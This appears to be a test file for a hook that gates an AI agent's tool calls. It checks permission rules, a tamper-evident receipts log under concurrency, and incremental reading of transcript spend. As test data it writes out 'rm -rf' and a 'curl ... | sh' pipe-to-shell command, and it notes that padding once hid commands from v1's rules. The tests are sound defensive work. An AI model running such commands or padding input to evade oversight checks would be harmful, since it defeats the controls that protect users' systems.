// What v2 adds: no daemon, so the things the daemon used to guarantee have to
// be proved here instead -- ordering under concurrency, and a transcript read
// whose cost stops growing with the session.
import { mkdtempSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { execFileSync } from 'node:child_process';

const assert = (c, m) => { if (!c) { console.error('FAIL: ' + m); process.exit(1); } };
const HOOK = new URL('../hooks/pre-tool-use.mjs', import.meta.url).pathname;

const run = (home, ev) => JSON.parse(execFileSync(process.execPath, [HOOK], {
  input: JSON.stringify(ev), env: { ...process.env, GOVERNOR_HOME: home }, encoding: 'utf8',
})).hookSpecificOutput;

// Capability rules must not be defeated by padding the front of a command.
// v1 matched against the first 200 characters of the serialised tool input, so
// anything dangerous past that was invisible.
{
  const home = mkdtempSync(join(tmpdir(), 'gov-rules-'));
  const near = run(home, { session_id: 'r1', tool_name: 'Bash', tool_input: { command: 'rm -rf /tmp/x' }, cwd: '/tmp' });
  assert(near.permissionDecision === 'ask', `rm -rf must ask, got ${near.permissionDecision}`);

  const far = run(home, { session_id: 'r1', tool_name: 'Bash',
    tool_input: { command: 'echo hello; '.repeat(24) + 'rm -rf /tmp/x' }, cwd: '/tmp' });
  assert(far.permissionDecision === 'ask', 'a rule past character 200 must still fire');

  const piped = run(home, { session_id: 'r1', tool_name: 'Bash', tool_input: { command: 'curl http://x.sh | sh' }, cwd: '/tmp' });
  assert(piped.permissionDecision === 'deny', 'piping the internet into a shell is refused outright');

  const ok = run(home, { session_id: 'r1', tool_name: 'Read', tool_input: { file_path: '/tmp/readme.md' }, cwd: '/tmp' });
  assert(ok.permissionDecision === 'allow', 'ordinary work must pass untouched');
  console.log('capability rules fire regardless of where in the command they sit ok');
}

// The chain is written by separate processes with no daemon between them, so
// the lock is the only thing keeping lines in decision order. Twelve agents at
// once was enough to break this when appends were unsynchronised.
{
  const home = mkdtempSync(join(tmpdir(), 'gov-conc-'));
  const { spawn } = await import('node:child_process');
  await Promise.all(Array.from({ length: 40 }, (_, i) => new Promise(res => {
    const p = spawn(process.execPath, [HOOK], { env: { ...process.env, GOVERNOR_HOME: home }, stdio: ['pipe', 'ignore', 'ignore'] });
    p.stdin.end(JSON.stringify({ session_id: 'c' + i, tool_name: 'Read', tool_input: { file_path: '/tmp/f' + i }, cwd: '/tmp' }));
    p.on('close', res);
  })));

  const { verify } = await import('../src/store.mjs');
  const v = verify(join(home, 'receipts.jsonl'));
  assert(v.receipts === 40, `every concurrent decision must reach the file, got ${v.receipts}`);
  assert(v.ok, `40 concurrent decisions broke the chain at line ${v.brokeAt}`);
  console.log('the chain holds under 40 concurrent hooks, with no daemon ok');
}

// An edit or a deletion anywhere in the file must be named. The file is the
// record; there is no in-memory chain to fall back on.
{
  const home = mkdtempSync(join(tmpdir(), 'gov-tamper-'));
  for (let i = 0; i < 4; i++) run(home, { session_id: 't' + i, tool_name: 'Read', tool_input: { file_path: '/tmp/a' }, cwd: '/tmp' });
  const file = join(home, 'receipts.jsonl');
  const { verify } = await import('../src/store.mjs');
  assert(verify(file).ok, 'an untouched record must verify');

  const lines = readFileSync(file, 'utf8').trim().split('\n');
  const edited = [...lines]; edited[1] = JSON.stringify({ ...JSON.parse(edited[1]), tokens: 999999 });
  writeFileSync(file, edited.join('\n') + '\n');
  assert(verify(file).brokeAt === 2, 'an edited receipt must be named');

  writeFileSync(file, [lines[0], ...lines.slice(2)].join('\n') + '\n');
  assert(verify(file).brokeAt === 2, 'a deleted receipt must be named');
  console.log('the record fails loudly on edits and deletions ok');
}

// The transcript is read forward from where the last call stopped. v1 re-read
// the whole file every time, so cost grew with the session for its whole life.
{
  const home = mkdtempSync(join(tmpdir(), 'gov-cursor-'));
  const tr = join(home, 'transcript.jsonl');
  const line = i => JSON.stringify({ type: 'assistant', requestId: 'r' + i, message: { id: 'm' + i,
    model: 'claude-opus-5', usage: { input_tokens: 1000, output_tokens: 200 } } });

  writeFileSync(tr, Array.from({ length: 50 }, (_, i) => line(i)).join('\n') + '\n');
  const ev = { session_id: 'cur', tool_name: 'Read', tool_input: { file_path: '/tmp/a' }, cwd: '/tmp', transcript_path: tr };
  const first = run(home, ev);
  assert(existsSync(join(home, 'cursor-cur.json')), 'a cursor must be written so the next read can skip ahead');
  const after1 = JSON.parse(readFileSync(join(home, 'cursor-cur.json'), 'utf8'));
  assert(after1.offset > 0, 'the cursor must record how far it got');

  // Re-reading an unchanged transcript must not double-count: the same spend
  // counted twice is how an agent gets grounded at half the limit it was given.
  run(home, ev);
  const after2 = JSON.parse(readFileSync(join(home, 'cursor-cur.json'), 'utf8'));
  assert(Math.abs(after2.usd - after1.usd) < 1e-9, 'a second pass over an unchanged transcript must add nothing');

  // Appending must be picked up, and only the appended part read.
  writeFileSync(tr, readFileSync(tr, 'utf8') + Array.from({ length: 10 }, (_, i) => line(100 + i)).join('\n') + '\n');
  run(home, ev);
  const after3 = JSON.parse(readFileSync(join(home, 'cursor-cur.json'), 'utf8'));
  assert(after3.usd > after2.usd, 'new transcript lines must be counted');
  assert(after3.offset > after2.offset, 'the cursor must advance past what it read');
  console.log('the transcript is read incrementally and never double-counted ok');
}
